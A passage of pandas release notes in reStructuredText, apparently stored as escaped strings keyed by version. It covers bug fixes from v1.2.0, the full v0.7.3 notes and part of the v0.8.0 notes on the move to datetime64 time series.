(:issue:`33494`)\n\nI/O\n^^^\n\n- :func:`read_sas` no longer leaks resources on failure (:issue:`35566`)\n- Bug in :meth:`DataFrame.to_csv` and :meth:`Series.to_csv` caused a ``ValueError`` when it was called with a filename in combination with ``mode`` containing a ``b`` (:issue:`35058`)\n- Bug in :meth:`read_csv` with ``float_precision='round_trip'`` did not handle ``decimal`` and ``thousands`` parameters (:issue:`35365`)\n- :meth:`to_pickle` and :meth:`read_pickle` were closing user-provided file objects (:issue:`35679`)\n- :meth:`to_csv` passes compression arguments for ``'gzip'`` always to ``gzip.GzipFile`` (:issue:`28103`)\n- :meth:`to_csv` did not support zip compression for binary file object not having a filename (:issue:`35058`)\n- :meth:`to_csv` and :meth:`read_csv` did not honor ``compression`` and ``encoding`` for path-like objects that are internally converted to file-like objects (:issue:`35677`, :issue:`26124`, :issue:`32392`)\n- :meth:`DataFrame.to_pickle`, :meth:`Series.to_pickle`, and :meth:`read_pickle` did not support compression for file-objects (:issue:`26237`, :issue:`29054`, :issue:`29570`)\n- Bug in :func:`LongTableBuilder.middle_separator` was duplicating LaTeX longtable entries in the List of Tables of a LaTeX document (:issue:`34360`)\n- Bug in :meth:`read_csv` with ``engine='python'`` truncating data if multiple items present in first row and first element started with BOM (:issue:`36343`)\n- Removed ``private_key`` and ``verbose`` from :func:`read_gbq` as they are no longer supported in ``pandas-gbq`` (:issue:`34654`, :issue:`30200`)\n- Bumped minimum pytables version to 3.5.1 to avoid a ``ValueError`` in :meth:`read_hdf` (:issue:`24839`)\n- Bug in :func:`read_table` and :func:`read_csv` when ``delim_whitespace=True`` and ``sep=default`` (:issue:`36583`)\n- Bug in :meth:`DataFrame.to_json` and :meth:`Series.to_json` when used with ``lines=True`` and ``orient='records'`` the last line of the record is not appended with 'new line character' (:issue:`36888`)\n- Bug in :meth:`read_parquet` with fixed offset time zones. String representation of time zones was not recognized (:issue:`35997`, :issue:`36004`)\n- Bug in :meth:`DataFrame.to_html`, :meth:`DataFrame.to_string`, and :meth:`DataFrame.to_latex` ignoring the ``na_rep`` argument when ``float_format`` was also specified (:issue:`9046`, :issue:`13828`)\n- Bug in output rendering of complex numbers showing too many trailing zeros (:issue:`36799`)\n- Bug in :class:`HDFStore` threw a ``TypeError`` when exporting an empty DataFrame with ``datetime64[ns, tz]`` dtypes with a fixed HDF5 store (:issue:`20594`)\n- Bug in :class:`HDFStore` was dropping time zone information when exporting a Series with ``datetime64[ns, tz]`` dtypes with a fixed HDF5 store (:issue:`20594`)\n- :func:`read_csv` was closing user-provided binary file handles when ``engine=\"c\"`` and an ``encoding`` was requested (:issue:`36980`)\n- Bug in :meth:`DataFrame.to_hdf` was not dropping missing rows with ``dropna=True`` (:issue:`35719`)\n- Bug in :func:`read_html` was raising a ``TypeError`` when supplying a ``pathlib.Path`` argument to the ``io`` parameter (:issue:`37705`)\n- :meth:`DataFrame.to_excel`, :meth:`Series.to_excel`, :meth:`DataFrame.to_markdown`, and :meth:`Series.to_markdown` now support writing to fsspec URLs such as S3 and Google Cloud Storage (:issue:`33987`)\n- Bug in :func:`read_fwf` with ``skip_blank_lines=True`` was not skipping blank lines (:issue:`37758`)\n- Parse missing values using :func:`read_json` with ``dtype=False`` to ``NaN`` instead of ``None`` (:issue:`28501`)\n- :meth:`read_fwf` was inferring compression with ``compression=None`` which was not consistent with the other ``read_*`` functions (:issue:`37909`)\n- :meth:`DataFrame.to_html` was ignoring ``formatters`` argument for ``ExtensionDtype`` columns (:issue:`36525`)\n- Bumped minimum xarray version to 0.12.3 to avoid reference to the removed ``Panel`` class (:issue:`27101`, :issue:`37983`)\n- :meth:`DataFrame.to_csv` was re-opening file-like handles that also implement ``os.PathLike`` (:issue:`38125`)\n- Bug in the conversion of a sliced ``pyarrow.Table`` with missing values to a DataFrame (:issue:`38525`)\n- Bug in :func:`read_sql_table` raising a ``sqlalchemy.exc.OperationalError`` when column names contained a percentage sign (:issue:`37517`)\n\nPeriod\n^^^^^^\n\n- Bug in :meth:`DataFrame.replace` and :meth:`Series.replace` where :class:`Period` dtypes would be converted to object dtypes (:issue:`34871`)\n\nPlotting\n^^^^^^^^\n\n- Bug in :meth:`DataFrame.plot` was rotating xticklabels when ``subplots=True``, even if the x-axis wasn't an irregular time series (:issue:`29460`)\n- Bug in :meth:`DataFrame.plot` where a marker letter in the ``style`` keyword sometimes caused a ``ValueError`` (:issue:`21003`)\n- Bug in :meth:`DataFrame.plot.bar` and :meth:`Series.plot.bar` where ticks positions were assigned by value order instead of using the actual value for numeric or a smart ordering for string (:issue:`26186`, :issue:`11465`). This fix has been reverted in pandas 1.2.1, see :doc:`v1.2.1`\n- Twinned axes were losing their tick labels which should only happen to all but the last row or column of 'externally' shared axes (:issue:`33819`)\n- Bug in :meth:`Series.plot` and :meth:`DataFrame.plot` was throwing a :exc:`ValueError` when the Series or DataFrame was\n  indexed by a :class:`.TimedeltaIndex` with a fixed frequency and the x-axis lower limit was greater than the upper limit (:issue:`37454`)\n- Bug in :meth:`.DataFrameGroupBy.boxplot` when ``subplots=False`` would raise a ``KeyError`` (:issue:`16748`)\n- Bug in :meth:`DataFrame.plot` and :meth:`Series.plot` was overwriting matplotlib's shared y axes behavior when no ``sharey`` parameter was passed (:issue:`37942`)\n- Bug in :meth:`DataFrame.plot` was raising a ``TypeError`` with ``ExtensionDtype`` columns (:issue:`32073`)\n\nStyler\n^^^^^^\n\n- Bug in :meth:`Styler.render` HTML was generated incorrectly because of formatting error in ``rowspan`` attribute, it now matches with w3 syntax (:issue:`38234`)\n\nGroupby/resample/rolling\n^^^^^^^^^^^^^^^^^^^^^^^^\n\n- Bug in :meth:`.DataFrameGroupBy.count` and :meth:`SeriesGroupBy.sum` returning ``NaN`` for missing categories when grouped on multiple ``Categoricals``. Now returning ``0`` (:issue:`35028`)\n- Bug in :meth:`.DataFrameGroupBy.apply` that would sometimes throw an erroneous ``ValueError`` if the grouping axis had duplicate entries (:issue:`16646`)\n- Bug in :meth:`DataFrame.resample` that would throw a ``ValueError`` when resampling from ``\"D\"`` to ``\"24H\"`` over a transition into daylight savings time (DST) (:issue:`35219`)\n- Bug when combining methods :meth:`DataFrame.groupby` with :meth:`DataFrame.resample` and :meth:`DataFrame.interpolate` raising a ``TypeError`` (:issue:`35325`)\n- Bug in :meth:`.DataFrameGroupBy.apply` where a non-nuisance grouping column would be dropped from the output columns if another groupby method was called before ``.apply`` (:issue:`34656`)\n- Bug when subsetting columns on a :class:`.DataFrameGroupBy` (e.g. ``df.groupby('a')[['b']])``) would reset the attributes ``axis``, ``dropna``, ``group_keys``, ``level``, ``mutated``, ``sort``, and ``squeeze`` to their default values (:issue:`9959`)\n- Bug in :meth:`.DataFrameGroupBy.tshift` failing to raise ``ValueError`` when a frequency cannot be inferred for the index of a group (:issue:`35937`)\n- Bug in :meth:`DataFrame.groupby` does not always maintain column index name for ``any``, ``all``, ``bfill``, ``ffill``, ``shift`` (:issue:`29764`)\n- Bug in :meth:`.DataFrameGroupBy.apply` raising error with ``np.nan`` group(s) when ``dropna=False`` (:issue:`35889`)\n- Bug in :meth:`.Rolling.sum` returned wrong values when dtypes where mixed between float and integer and ``axis=1`` (:issue:`20649`, :issue:`35596`)\n- Bug in :meth:`.Rolling.count` returned ``np.nan`` with :class:`~pandas.api.indexers.FixedForwardWindowIndexer` as window, ``min_periods=0`` and only missing values in the window (:issue:`35579`)\n- Bug where :class:`.Rolling` produces incorrect window sizes when using a ``PeriodIndex`` (:issue:`34225`)\n- Bug in :meth:`.DataFrameGroupBy.ffill` and :meth:`.DataFrameGroupBy.bfill` where a ``NaN`` group would return filled values instead of ``NaN`` when ``dropna=True`` (:issue:`34725`)\n- Bug in :meth:`.RollingGroupby.count` where a ``ValueError`` was raised when specifying the ``closed`` parameter (:issue:`35869`)\n- Bug in :meth:`.DataFrameGroupBy.rolling` returning wrong values with partial centered window (:issue:`36040`)\n- Bug in :meth:`.DataFrameGroupBy.rolling` returned wrong values with time aware window containing ``NaN``. Raises ``ValueError`` because windows are not monotonic now (:issue:`34617`)\n- Bug in :meth:`.Rolling.__iter__` where a ``ValueError`` was not raised when ``min_periods`` was larger than ``window`` (:issue:`37156`)\n- Using :meth:`.Rolling.var` instead of :meth:`.Rolling.std` avoids numerical issues for :meth:`.Rolling.corr` when :meth:`.Rolling.var` is still within floating point precision while :meth:`.Rolling.std` is not (:issue:`31286`)\n- Bug in :meth:`.DataFrameGroupBy.quantile` and :meth:`.Resampler.quantile` raised ``TypeError`` when values were of type ``Timedelta`` (:issue:`29485`)\n- Bug in :meth:`.Rolling.median` and :meth:`.Rolling.quantile` returned wrong values for :class:`.BaseIndexer` subclasses with non-monotonic starting or ending points for windows (:issue:`37153`)\n- Bug in :meth:`DataFrame.groupby` dropped ``nan`` groups from result with ``dropna=False`` when grouping over a single column (:issue:`35646`, :issue:`35542`)\n- Bug in :meth:`.DataFrameGroupBy.head`, :meth:`DataFrameGroupBy.tail`, :meth:`SeriesGroupBy.head`, and :meth:`SeriesGroupBy.tail` would raise when used with ``axis=1`` (:issue:`9772`)\n- Bug in :meth:`.DataFrameGroupBy.transform` would raise when used with ``axis=1`` and a transformation kernel (e.g. \"shift\") (:issue:`36308`)\n- Bug in :meth:`.DataFrameGroupBy.resample` using ``.agg`` with sum produced different result than just calling ``.sum`` (:issue:`33548`)\n- Bug in :meth:`.DataFrameGroupBy.apply` dropped values on ``nan`` group when returning the same axes with the original frame (:issue:`38227`)\n- Bug in :meth:`.DataFrameGroupBy.quantile` couldn't handle with arraylike ``q`` when grouping by columns (:issue:`33795`)\n- Bug in :meth:`DataFrameGroupBy.rank` with ``datetime64tz`` or period dtype incorrectly casting results to those dtypes instead of returning ``float64`` dtype (:issue:`38187`)\n\nReshaping\n^^^^^^^^^\n\n- Bug in :meth:`DataFrame.crosstab` was returning incorrect results on inputs with duplicate row names, duplicate column names or duplicate names between row and column labels (:issue:`22529`)\n- Bug in :meth:`DataFrame.pivot_table` with ``aggfunc='count'`` or ``aggfunc='sum'`` returning ``NaN`` for missing categories when pivoted on a ``Categorical``. Now returning ``0`` (:issue:`31422`)\n- Bug in :func:`concat` and :class:`DataFrame` constructor where input index names are not preserved in some cases (:issue:`13475`)\n- Bug in func :meth:`crosstab` when using multiple columns with ``margins=True`` and ``normalize=True`` (:issue:`35144`)\n- Bug in :meth:`DataFrame.stack` where an empty DataFrame.stack would raise an error (:issue:`36113`). Now returning an empty Series with empty MultiIndex.\n- Bug in :meth:`Series.unstack`. Now a Series with single level of Index trying to unstack would raise a ``ValueError`` (:issue:`36113`)\n- Bug in :meth:`DataFrame.agg` with ``func={'name':<FUNC>}`` incorrectly raising ``TypeError`` when ``DataFrame.columns==['Name']`` (:issue:`36212`)\n- Bug in :meth:`Series.transform` would give incorrect results or raise when the argument ``func`` was a dictionary (:issue:`35811`)\n- Bug in :meth:`DataFrame.pivot` did not preserve :class:`MultiIndex` level names for columns when rows and columns are both multiindexed (:issue:`36360`)\n- Bug in :meth:`DataFrame.pivot` modified ``index`` argument when ``columns`` was passed but ``values`` was not (:issue:`37635`)\n- Bug in :meth:`DataFrame.join` returned a non deterministic level-order for the resulting :class:`MultiIndex` (:issue:`36910`)\n- Bug in :meth:`DataFrame.combine_first` caused wrong alignment with dtype ``string`` and one level of ``MultiIndex`` containing only ``NA`` (:issue:`37591`)\n- Fixed regression in :func:`merge` on merging :class:`.DatetimeIndex` with empty DataFrame (:issue:`36895`)\n- Bug in :meth:`DataFrame.apply` not setting index of return value when ``func`` return type is ``dict`` (:issue:`37544`)\n- Bug in :meth:`DataFrame.merge` and :meth:`pandas.merge` returning inconsistent ordering in result for ``how=right`` and ``how=left`` (:issue:`35382`)\n- Bug in :func:`merge_ordered` couldn't handle list-like ``left_by`` or ``right_by`` (:issue:`35269`)\n- Bug in :func:`merge_ordered` returned wrong join result when length of ``left_by`` or ``right_by`` equals to the rows of ``left`` or ``right`` (:issue:`38166`)\n- Bug in :func:`merge_ordered` didn't raise when elements in ``left_by`` or ``right_by`` not exist in ``left`` columns or ``right`` columns (:issue:`38167`)\n- Bug in :func:`DataFrame.drop_duplicates` not validating bool dtype for ``ignore_index`` keyword (:issue:`38274`)\n\nExtensionArray\n^^^^^^^^^^^^^^\n\n- Fixed bug where :class:`DataFrame` column set to scalar extension type via a dict instantiation was considered an object type rather than the extension type (:issue:`35965`)\n- Fixed bug where ``astype()`` with equal dtype and ``copy=False`` would return a new object (:issue:`28488`)\n- Fixed bug when applying a NumPy ufunc with multiple outputs to an :class:`.IntegerArray` returning ``None`` (:issue:`36913`)\n- Fixed an inconsistency in :class:`.PeriodArray`'s ``__init__`` signature to those of :class:`.DatetimeArray` and :class:`.TimedeltaArray` (:issue:`37289`)\n- Reductions for :class:`.BooleanArray`, :class:`.Categorical`, :class:`.DatetimeArray`, :class:`.FloatingArray`, :class:`.IntegerArray`, :class:`.PeriodArray`, :class:`.TimedeltaArray`, and :class:`.PandasArray` are now keyword-only methods (:issue:`37541`)\n- Fixed a bug where a  ``TypeError`` was wrongly raised if a membership check was made on an ``ExtensionArray`` containing nan-like values (:issue:`37867`)\n\nOther\n^^^^^\n\n- Bug in :meth:`DataFrame.replace` and :meth:`Series.replace` incorrectly raising an ``AssertionError`` instead of a ``ValueError`` when invalid parameter combinations are passed (:issue:`36045`)\n- Bug in :meth:`DataFrame.replace` and :meth:`Series.replace` with numeric values and string ``to_replace`` (:issue:`34789`)\n- Fixed metadata propagation in :meth:`Series.abs` and ufuncs called on Series and DataFrames (:issue:`28283`)\n- Bug in :meth:`DataFrame.replace` and :meth:`Series.replace` incorrectly casting from ``PeriodDtype`` to object dtype (:issue:`34871`)\n- Fixed bug in metadata propagation incorrectly copying DataFrame columns as metadata when the column name overlaps with the metadata name (:issue:`37037`)\n- Fixed metadata propagation in the :class:`Series.dt`, :class:`Series.str` accessors, :class:`DataFrame.duplicated`, :class:`DataFrame.stack`, :class:`DataFrame.unstack`, :class:`DataFrame.pivot`, :class:`DataFrame.append`, :class:`DataFrame.diff`, :class:`DataFrame.applymap` and :class:`DataFrame.update` methods (:issue:`28283`, :issue:`37381`)\n- Fixed metadata propagation when selecting columns with ``DataFrame.__getitem__`` (:issue:`28283`)\n- Bug in :meth:`Index.intersection` with non-:class:`Index` failing to set the correct name on the returned :class:`Index` (:issue:`38111`)\n- Bug in :meth:`RangeIndex.intersection` failing to set the correct name on the returned :class:`Index` in some corner cases (:issue:`38197`)\n- Bug in :meth:`Index.difference` failing to set the correct name on the returned :class:`Index` in some corner cases (:issue:`38268`)\n- Bug in :meth:`Index.union` behaving differently depending on whether operand is an :class:`Index` or other list-like (:issue:`36384`)\n- Bug in :meth:`Index.intersection` with non-matching numeric dtypes casting to ``object`` dtype instead of minimal common dtype (:issue:`38122`)\n- Bug in :meth:`IntervalIndex.union` returning an incorrectly-typed :class:`Index` when empty (:issue:`38282`)\n- Passing an array with 2 or more dimensions to the :class:`Series` constructor now raises the more specific ``ValueError`` rather than a bare ``Exception`` (:issue:`35744`)\n- Bug in ``dir`` where ``dir(obj)`` wouldn't show attributes defined on the instance for pandas objects (:issue:`37173`)\n- Bug in :meth:`Index.drop` raising ``InvalidIndexError`` when index has duplicates (:issue:`38051`)\n- Bug in :meth:`RangeIndex.difference` returning :class:`Int64Index` in some cases where it should return :class:`RangeIndex` (:issue:`38028`)\n- Fixed bug in :func:`assert_series_equal` when comparing a datetime-like array with an equivalent non extension dtype array (:issue:`37609`)\n- Bug in :func:`.is_bool_dtype` would raise when passed a valid string such as ``\"boolean\"`` (:issue:`38386`)\n- Fixed regression in logical operators raising ``ValueError`` when columns of :class:`DataFrame` are a :class:`CategoricalIndex` with unused categories (:issue:`38367`)\n\n.. ---------------------------------------------------------------------------\n\n.. _whatsnew_120.contributors:\n\nContributors\n~~~~~~~~~~~~\n\n.. contributors:: v1.1.5..v1.2.0\n", "0.7.3": ".. _whatsnew_0703:\n\nVersion 0.7.3 (April 12, 2012)\n------------------------------\n\n{{ header }}\n\n\nThis is a minor release from 0.7.2 and fixes many minor bugs and adds a number\nof nice new features. There are also a couple of API changes to note; these\nshould not affect very many users, and we are inclined to call them \"bug fixes\"\neven though they do constitute a change in behavior. See the :ref:`full release\nnotes <release>` or issue\ntracker on GitHub for a complete list.\n\nNew features\n~~~~~~~~~~~~\n\n- New :ref:`fixed width file reader <io.fwf>`, ``read_fwf``\n- New :ref:`scatter_matrix <visualization.scatter_matrix>` function for making\n  a scatter plot matrix\n\n.. code-block:: python\n\n   from pandas.tools.plotting import scatter_matrix\n\n   scatter_matrix(df, alpha=0.2)  # noqa F821\n\n\n- Add ``stacked`` argument to Series and DataFrame's ``plot`` method for\n  :ref:`stacked bar plots <visualization.barplot>`.\n\n.. code-block:: python\n\n   df.plot(kind=\"bar\", stacked=True)  # noqa F821\n\n\n.. code-block:: python\n\n   df.plot(kind=\"barh\", stacked=True)  # noqa F821\n\n\n- Add log x and y :ref:`scaling options <visualization.basic>` to\n  ``DataFrame.plot`` and ``Series.plot``\n- Add ``kurt`` methods to Series and DataFrame for computing kurtosis\n\n\nNA boolean comparison API change\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n\nReverted some changes to how NA values (represented typically as ``NaN`` or\n``None``) are handled in non-numeric Series:\n\n.. code-block:: ipython\n\n   In [1]: series = pd.Series([\"Steve\", np.nan, \"Joe\"])\n\n   In [2]: series == \"Steve\"\n   Out[2]:\n   0     True\n   1    False\n   2    False\n   Length: 3, dtype: bool\n\n   In [3]: series != \"Steve\"\n   Out[3]:\n   0    False\n   1     True\n   2     True\n   Length: 3, dtype: bool\n\nIn comparisons, NA / NaN will always come through as ``False`` except with\n``!=`` which is ``True``. *Be very careful* with boolean arithmetic, especially\nnegation, in the presence of NA data. You may wish to add an explicit NA\nfilter into boolean array operations if you are worried about this:\n\n.. code-block:: ipython\n\n   In [4]: mask = series == \"Steve\"\n\n   In [5]: series[mask & series.notnull()]\n   Out[5]:\n   0    Steve\n   Length: 1, dtype: object\n\nWhile propagating NA in comparisons may seem like the right behavior to some\nusers (and you could argue on purely technical grounds that this is the right\nthing to do), the evaluation was made that propagating NA everywhere, including\nin numerical arrays, would cause a large amount of problems for users. Thus, a\n\"practicality beats purity\" approach was taken. This issue may be revisited at\nsome point in the future.\n\nOther API changes\n~~~~~~~~~~~~~~~~~\n\nWhen calling ``apply`` on a grouped Series, the return value will also be a\nSeries, to be more consistent with the ``groupby`` behavior with DataFrame:\n\n.. code-block:: ipython\n\n      In [6]: df = pd.DataFrame(\n         ...:     {\n         ...:         \"A\": [\"foo\", \"bar\", \"foo\", \"bar\", \"foo\", \"bar\", \"foo\", \"foo\"],\n         ...:         \"B\": [\"one\", \"one\", \"two\", \"three\", \"two\", \"two\", \"one\", \"three\"],\n         ...:         \"C\": np.random.randn(8),\n         ...:         \"D\": np.random.randn(8),\n         ...:     }\n         ...: )\n         ...:\n\n      In [7]: df\n      Out[7]:\n         A      B         C         D\n      0  foo    one  0.469112 -0.861849\n      1  bar    one -0.282863 -2.104569\n      2  foo    two -1.509059 -0.494929\n      3  bar  three -1.135632  1.071804\n      4  foo    two  1.212112  0.721555\n      5  bar    two -0.173215 -0.706771\n      6  foo    one  0.119209 -1.039575\n      7  foo  three -1.044236  0.271860\n\n      [8 rows x 4 columns]\n\n      In [8]: grouped = df.groupby(\"A\")[\"C\"]\n\n      In [9]: grouped.describe()\n      Out[9]:\n         count      mean       std       min       25%       50%       75%       max\n      A\n      bar    3.0 -0.530570  0.526860 -1.135632 -0.709248 -0.282863 -0.228039 -0.173215\n      foo    5.0 -0.150572  1.113308 -1.509059 -1.044236  0.119209  0.469112  1.212112\n\n      [2 rows x 8 columns]\n\n      In [10]: grouped.apply(lambda x: x.sort_values()[-2:])  # top 2 values\n      Out[10]:\n      A\n      bar  1   -0.282863\n           5   -0.173215\n      foo  0    0.469112\n           4    1.212112\n      Name: C, Length: 4, dtype: float64\n\n\n.. _whatsnew_0.7.3.contributors:\n\nContributors\n~~~~~~~~~~~~\n\n.. contributors:: v0.7.2..v0.7.3\n", "0.8.0": ".. _whatsnew_080:\n\nVersion 0.8.0 (June 29, 2012)\n-----------------------------\n\n{{ header }}\n\n\nThis is a major release from 0.7.3 and includes extensive work on the time\nseries handling and processing infrastructure as well as a great deal of new\nfunctionality throughout the library. It includes over 700 commits from more\nthan 20 distinct authors. Most pandas 0.7.3 and earlier users should not\nexperience any issues upgrading, but due to the migration to the NumPy\ndatetime64 dtype, there may be a number of bugs and incompatibilities\nlurking. Lingering incompatibilities will be fixed ASAP in a 0.8.1 release if\nnecessary. See the :ref:`full release notes\n<release>` or issue tracker\non GitHub for a complete list.\n\nSupport for non-unique indexes\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n\nAll objects can now work with non-unique indexes. Data alignment / join\noperations work according to SQL join semantics (including, if application,\nindex duplication in many-to-many joins)\n\nNumPy datetime64 dtype and 1.6 dependency\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n\nTime series data are now represented using NumPy's datetime64 dtype; thus,\npandas 0.8.0 now requires at least NumPy 1.6. It has been tested and verified\nto work with the development version (1.7+) of NumPy as well which includes\nsome significant user-facing API changes. NumPy 1.6 also has a number of bugs\nhaving to do with nanosecond resolution data, so I recommend that you steer\nclear of NumPy 1.6's datetime64 API functions (though limited as they are) and\nonly interact with this data using the interface that pandas provides.\n\nSee the end of the 0.8.0 section for a \"porting\" guide listing potential issues\nfor users migrating legacy code bases from pandas 0.7 or earlier to 0.8.0.\n\nBug fixes to the 0.7.x series for legacy NumPy < 1.6 users will be provided as\nthey arise. There will be no more further development in 0.7.x beyond bug\nfixes.\n\nTime Series changes and improvements\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n\n.. note::\n\n    With this release, legacy scikits.timeseries users should be able to port\n    their code to use pandas.\n\n.. note::\n\n    See :ref:`documentation <timeseries>` for overview of pandas timeseries API.\n\n- New datetime64 representation **speeds up join operations and data\n  alignment**, **reduces memory usage**, and improve serialization /\n  deserialization performance significantly over datetime.datetime\n- High performance and flexible **resample** method for converting from\n  high-to-low and low-to-high frequency. Supports interpolation, user-defined\n  aggregation functions, and control over how the intervals and result labeling\n  are defined. A suite of high performance Cython/C-based resampling functions\n  (including Open-High-Low-Close) have also been implemented.\n- Revamp of :ref:`frequency aliases <timeseries.offset_aliases>` and support for\n  **frequency shortcuts** like '15min', or '1h30min'\n- New :ref:`DatetimeIndex class <timeseries.datetimeindex>` supports both fixed\n  frequency and irregular time\n  series. Replaces now deprecated DateRange class\n- New ``PeriodIndex`` and ``Period`` classes for representing\n  :ref:`time spans <timeseries.periods>` and performing **calendar logic**,\n  including the ``12 fiscal quarterly frequencies <timeseries.quarterly>``.\n  This is a partial port of, and a substantial enhancement to,\n  elements of the scikits.timeseries code base. Support for conversion between\n  PeriodIndex and DatetimeIndex\n- New Timestamp data type subclasses ``datetime.datetime``, providing the same\n  interface while enabling working with nanosecond-resolution data. Also\n  provides :ref:`easy time zone conversions <timeseries.timezone>`.\n- Enhanced support for :ref:`time zones <timeseries.timezone>`. Add\n  ``tz_convert`` and ``tz_localize`` methods to TimeSeries and DataFrame. All\n  timestamps are stored as UTC; Timestamps from DatetimeIndex objects with time\n  zone set will be localized to local time. Time zone conversions are therefore\n  essentially free. User needs to know very little about pytz library now; only\n  time zone names as strings are required. Time zone-aware timestamps are\n  equal if and only if their UTC timestamps match. Operations between time\n  zone-aware time series with different time zones will result in a UTC-indexed\n  time series.\n- Time series **string indexing conveniences** / shortcuts: slice years, year\n  and month, and index values with strings\n- Enhanced time series **plotting**; adaptation of scikits.timeseries\n  matplotlib-based plotting code\n- New ``date_range``, ``bdate_range``, and ``period_range`` :ref:`factory\n  functions <timeseries.daterange>`\n- Robust **frequency inference** function ``infer_freq`` and ``inferred_freq``\n  property of DatetimeIndex, with option to infer frequency on construction of\n  DatetimeIndex\n- to_datetime function efficiently **parses array of strings** to\n  DatetimeIndex. DatetimeIndex will parse array or list of strings to\n  datetime64\n- **Optimized** support for datetime64-dtype data in Series and DataFrame\n  columns\n- New NaT (Not-a-Time) type to represent **NA** in timestamp arrays\n- Optimize Series.asof for looking up **\"as of\" values** for arrays of\n  timestamps\n- Milli, Micro, Nano date offset objects\n- Can index time series with datetime.time objects to select all data at\n  particular **time of day** (``TimeSeries.at_time``) or **between two times**\n  (``TimeSeries.between_time``)\n- Add :ref:`tshift <timeseries.advanced_datetime>` method for leading/lagging\n  using the frequency (if any) of the index, as opposed to a naive lead/lag\n  using shift\n\nOther new features\n~~~~~~~~~~~~~~~~~~\n\n- New :ref:`cut <reshaping.tile.cut>` and ``qcut`` functions (like R's cut\n  function) for computing a categorical variable from a continuous variable by\n  binning values either into value-based (``cut``) or quantile-based (``qcut``)\n  bins\n- Rename ``Factor`` to ``Categorical`` and add a number of usability features\n- Add :ref:`limit <missing_data.fillna.limit>` argument to fillna/reindex\n- More flexible multiple function application in GroupBy, and can pass list\n  (name, function) tuples to get result in particular order with given names\n- Add flexible :ref:`replace <missing_data.replace>` method for efficiently\n  substituting values\n- Enhanced :ref:`read_csv/read_table <io.parse_dates>` for reading time series\n  data and converting multiple columns to dates\n- Add :ref:`comments <io.comments>` option to parser functions: read_csv, etc.\n- Add :ref:`dayfirst <io.dayfirst>` option to parser functions for parsing\n  international DD/MM/YYYY dates\n- Allow the user to specify the CSV reader :ref:`dialect <io.dialect>` to\n  control quoting etc.\n- Handling :ref:`thousands <io.thousands>` separators in read_csv to improve\n  integer parsing.\n- Enable unstacking of multiple levels in one shot. Alleviate ``pivot_table``\n  bugs (empty columns being introduced)\n- Move to klib-based hash tables for indexing; better performance and less\n  memory usage than Python's dict\n- Add first, last, min, max, and prod optimized GroupBy functions\n- New :ref:`ordered_merge <merging.merge_ordered>` function\n- Add flexible :ref:`comparison <basics.binop>` instance methods eq, ne, lt,\n  gt, etc. to DataFrame, Series\n- Improve :ref:`scatter_matrix <visualization.scatter_matrix>` plotting\n  function and add histogram or kernel density estimates to diagonal\n- Add :ref:`'kde' <visualization.kde>` plot option for density plots\n- Support for converting DataFrame to R data.frame through rpy2\n- Improved support for complex numbers in Series and DataFrame\n- Add ``pct_change`` method to all data structures\n- Add max_colwidth configuration option for DataFrame console output\n- :ref:`Interpolate <missing_data.interpolate>` Series values using index values\n- Can select multiple columns from GroupBy\n- Add :ref:`update <merging.combine_first.update>` methods to Series/DataFrame\n  for updating values in place\n- Add ``any`` and ``all`` method to DataFrame\n\nNew plotting methods\n~~~~~~~~~~~~~~~~~~~~\n\n.. code-block:: python\n\n   import pandas as pd\n\n   fx = pd.read_pickle(\"data/fx_prices\")\n   import matplotlib.pyplot as plt\n\n``Series.plot`` now supports a ``secondary_y`` option:\n\n.. code-block:: python\n\n   plt.figure()\n\n   fx[\"FR\"].plot(style=\"g\")\n\n   fx[\"IT\"].plot(style=\"k--\", secondary_y=True)\n\nVytautas Jancauskas, the 2012 GSOC participant, has added many new plot\ntypes. For example, ``'kde'`` is a new option:\n\n.. code-block:: python\n\n   s = pd.Series(\n       np.concatenate((np.random.randn(1000), np.random.randn(1000) * 0.5 + 3))\n   )\n   plt.figure()\n   s.hist(density=True, alpha=0.2)\n   s.plot(kind=\"kde\")\n\nSee :ref:`the plotting page <visualization.other>` for much more.\n\nOther API changes\n~~~~~~~~~~~~~~~~~\n\n- Deprecation of ``offset``, ``time_rule``, and ``timeRule`` arguments names in\n  time series functions. Warnings will be printed until pandas 0.9 or 1.0.\n\nPotential porting issues for pandas <= 0.7.3 users\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n\nThe major change that may affect you in pandas 0.8.0 is that time series\nindexes use NumPy's ``datetime64`` data type instead of ``dtype=object`` arrays\nof Python's built-in ``datetime.datetime`` objects. ``DateRange`` has been\nreplaced by ``DatetimeIndex`` but otherwise behaved identically. But, if you\nhave code that converts ``DateRange`` or ``Index`` objects that used to contain\n``datetime.datetime`` values to plain NumPy arrays, you may have bugs lurking\nwith code using scalar values because you are handing control over to NumPy:\n\n.. ipython:: python\n\n   import datetime\n\n   rng = pd.date_range(\"1/1/2000\", periods=10)\n   rng[5]\n   isinstance(rng[5], datetime.datetime)\n   rng_asarray = np.asarray(rng)\n   scalar_val = rng_asarray[5]\n   type(scalar_val)\n\npandas's ``Timestamp`` object is a subclass of ``datetime.datetime`` that has\nnanosecond support (the ``nanosecond`` field store the nanosecond value between\n0 and 999). It should substitute directly into any code that used\n``datetime.datetime`` values before. Thus, I recommend not casting\n``DatetimeIndex`` to regular NumPy arrays.\n\nIf you have code that requires an array of ``datetime.datetime`` objects, you\nhave a couple of options. First, the ``astype(object)`` method of ``DatetimeIndex``\nproduces an array of ``Timestamp`` objects:\n\n.. ipython:: python\n\n   stamp_array = rng.astype(object)\n   stamp_array\n   stamp_array[5]\n\nTo get an array of proper ``datetime.datetime`` objects, use the\n``to_pydatetime`` method:\n\n.. ipython:: python\n\n   dt_array = rng.to_pydatetime()\n   dt_array\n   dt_array[5]\n\nmatplotlib knows how to handle ``datetime.datetime`` but not Timestamp\nobjects. While I recommend that you plot time series using ``TimeSeries.plot``,\nyou can either use ``to_pydatetime`` or register a converter for the Timestamp\ntype. See `matplotlib documentation\n<http://matplotlib.org/api/units_api.html>`__ for more on this.\n\n.. warning::\n\n    There are bugs in the user-facing API with the nanosecond datetime64 unit\n    in NumPy 1.6. In particular, the string version of the array shows garbage\n    values, and conversion to ``dtype=object`` is similarly broken.\n\n    .. ipython:: python\n\n       rng = pd.date_range(\"1/1/2000\", periods=10)\n       rng\n       np.asarray(rng)\n       converted = np.asarray(rng, dtype=object)\n       converted[5]\n\n  